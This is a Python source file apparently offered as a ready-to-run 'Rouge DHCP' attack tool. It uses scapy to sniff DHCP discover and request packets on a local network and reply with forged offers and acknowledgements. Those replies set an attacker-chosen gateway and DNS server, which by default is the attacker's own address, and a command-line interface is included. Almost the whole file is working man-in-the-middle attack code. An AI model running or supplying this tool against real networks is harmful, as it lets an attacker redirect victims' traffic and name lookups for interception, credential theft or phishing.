import logging

logging.getLogger("scapy.runtime").setLevel(logging.WARNING)
import six
from scapy.all import *
from termcolor import colored
from scapy.all import sendp,sniff
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, UDP
from scapy.layers.dhcp import BOOTP, DHCP
from netaddr import IPNetwork, IPAddress
import InterfaceIP


range_ip = []
ipServer = ""
interface = ""
gateway = ""
mask = ""
network = ""
domain = ""
domain_server = ""


class RougeDHCP:
    def valid_address(self,ip_address):
        """
        This Function is used To Validate IP Address Pattern
        """

        IPv4Pattern = re.compile(r'^(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])$')
        IPv6Pattern = re.compile(r'^(([0-9a-fA-F]{1,4})\:){7}([0-9a-fA-F]{1,4})$')

        if IPv4Pattern.match(ip_address):
            return "IPv4"
        elif IPv6Pattern.match(ip_address):
            return "IPv6"
        else:
            raise argparse.ArgumentTypeError('Invalid IP Address')


    def run(self,ip_Server, iface, gate, net, netmask, localdomain, domain_ip):
        """
        This function start to sniff DHCP packets

        ip_Server: Rouge DHCP server ip address -> Str
        iface: interface to be launched the attack -> Str
        gate: Rouge gateway ip address -> Str
        net: Rouge network of the ip pool -> Str
        netmask: Rouge netmask of the ip pool -> Str
        localdomain: Rouge name of the domain -> Str
        domain_ip: Rouge ip address of dns -> Str
        """
        print(ip_Server, iface, gate, net, netmask, localdomain, domain_ip)

        global range_ip
        global ipServer
        global interface
        global gateway
        global mask
        global network
        global domain
        global domain_server

        self.valid_address(ip_Server)
        self.valid_address(net)

        if gateway != "":
            self.valid_address(gate)

        try:
            IPAddress(netmask)
        except ValueError:
            raise TypeError("'%s' is not a valid mask" % netmask)

        ipServer = ip_Server
        interface = iface
        gateway = gate
        mask = netmask
        network = net
        domain = localdomain
        domain_server = domain_ip

        range_ip = list(IPNetwork(network+"/"+mask))  # create an ip list
        if IPAddress(ipServer) in range_ip:  # if ipServer is in ip list remove it
            range_ip.remove(IPAddress(ipServer))
        range_ip.pop()  # remove the broadcast ip
        range_ip.remove(IPAddress(network))  # remove the network address

        if IPAddress(gateway) in range_ip:  # if gateway ip is in ip list remove it
            range_ip.remove(IPAddress(gateway))

        if domain is None:
            domain = "Officedomain"

        if domain_server is None:
            domain_server = ipServer
        else:
            self.valid_address(domain_server)

        sniff(prn=self.is_DHCP, filter="udp and (port 67 or 68)", iface=interface)



    def is_DHCP(self,pkt):
        """
        This fuction check if DHCP is present in the packet.
        If packet is DHCP DISCOVER o DHCP REQUEST, sent the host configuration.
        """
        global range_ip
        global ipServer
        global interface
        global gateway
        global mask
        global network
        global domain
        global domain_server

        if gateway is None:
            gateway = ipServer

        messageType=""
        if DHCP in pkt:
            for x in pkt[DHCP].options:
                if x[0] == "message-type":
                    messageType = x[1]

            if messageType == 1:
                six.print_(colored("\n[!]", "red"), "DHCP DISCOVER LISTEN")
                print(pkt.summary())

                ipClient = str(range_ip[-1])

                ether = Ether(dst="ff:ff:ff:ff:ff:ff")
                ip = IP(src=ipServer, dst="255.255.255.255")
                udp = UDP(sport=67, dport=68)

                bootp= BOOTP(op=2, yiaddr=ipClient, siaddr=ipServer, chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid)

                dhcp = DHCP(options=[('message-type', 'offer'), ('subnet_mask', mask), ('server_id', ipServer),
                                     ('lease_time', 1800), ('domain', domain), ('router', gateway),
                                     ('name_server', domain_server), 'end'])

                dhcp_offer = ether/ip/udp/bootp/dhcp

                sendp(dhcp_offer, iface=interface, verbose=0)
                six.print_(colored("\n[!]", "red"), "DHCP OFFER SEND")
                print(dhcp_offer.summary())

            if messageType  == 3:
                six.print_(colored("\n[!]", "red"), "DHCP REQUEST LISTEN")
                print(pkt.summary())
                ipClient = str(range_ip.pop())
                ether = Ether(dst="ff:ff:ff:ff:ff:ff")
                ip = IP(src=ipServer, dst="255.255.255.255")
                udp = UDP(sport=67, dport=68)
                bootp= BOOTP(op=2, yiaddr=ipClient, siaddr=ipServer, chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid)
                dhcp = DHCP(options=[('message-type', 'ack'), ('subnet_mask', mask), ('server_id', ipServer),
                                     ('lease_time', 1800), ('domain', domain), ('router', gateway),
                                     ('name_server', domain_server), 'end'])

                ack = ether/ip/udp/bootp/dhcp

                sendp(ack, iface=interface, verbose=0)
                six.print_(colored("\n[!]", "red"), "DHCP ACK SEND")
                print(ack.summary())
                six.print_(colored("-----------------------------------------------------------------------------------------------------", "red"))

# run("10.0.0.1","eth1","10.0.0.1","192.168.1.0","255.255.255.0","mydomain","10.0.0.15")
# run("10.0.0.1","eth0","10.0.0.1","192.168.1.0","255.255.255.0","mydomain","10.0.0.15")




if __name__ == "__main__":
    import argparse
    """
    IF Rouge IP, Rouge Gateway and Rouge DNS Server is not mentioned 
    The system will automatically pick the IP Address of UP Interface
    """
    Default_IP = InterfaceIP.Made_Function()
    parser = argparse.ArgumentParser(description='Rouge DHCP')

    parser.add_argument('-r', '--rougedhcp', metavar="ROUGESERVERIP", default=Default_IP, type=str,
                        help='IP Address of Rouge Server')

    parser.add_argument('-i', '--iface', metavar="IFACE", default=conf.iface, type=str,
                        help='Interface you wish to use')

    parser.add_argument('-rg', '--rougegateway', metavar="ROUGEGATEWAY", default=Default_IP, type=str,
                        help='Gateway For Rouge IP Addresses')

    parser.add_argument('-rn', '--rougenetwork', metavar="ROUGENETWORK", default="192.168.1.0", type=str,
                        help='Network you wish to use in DHCP Pool')

    parser.add_argument('-s', '--subnet', metavar="SUBNET", default="255.255.255.0", type=str,
                        help='Subnet mask of the pool')

    parser.add_argument('-d', '--domain', metavar="DOMAINNAME", default="Officedomain", type=str,
                        help='Domain Name')

    parser.add_argument('-dn', '--dns', metavar="DNSSERVER", default=Default_IP, type=str,
                        help='Domain Name Server IP Address')

    args = parser.parse_args()

    RougeDHCP().run(args.rougedhcp, args.iface, args.rougegateway, args.rougenetwork, args.subnet, args.domain, args.dns)